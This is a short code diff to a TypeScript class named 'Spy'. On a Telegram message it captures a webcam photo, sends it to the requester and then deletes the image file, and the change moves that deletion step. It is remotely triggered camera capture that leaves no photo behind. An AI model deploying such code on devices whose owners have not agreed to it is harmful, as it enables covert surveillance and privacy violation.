@@ -34,7 +34,11 @@ export class Spy implements ISpy {
           }
 
           await this.webcamService.makePhoto(FILE_NAME);
-          await this.telegramService.sendPhoto(bodyParsed.message.from.id, `${this.configuration.currentPath}/${FILE_NAME}.jpg`);
+          await this.telegramService.sendPhoto(
+            bodyParsed.message.from.id,
+            `${this.configuration.currentPath}/${FILE_NAME}.jpg`,
+          );
+          await this.fileSystemService.removeFile(`${this.configuration.currentPath}/${FILE_NAME}.jpg`);
 
           (response as any).write('Hello World!');
           (response as any).end();
@@ -45,6 +49,5 @@ export class Spy implements ISpy {
     console.log(url);
 
     await this.telegramService.setWebhook(url);
-    await this.fileSystemService.removeFile(`${this.configuration.currentPath}/${FILE_NAME}.jpg`);
   }
 }
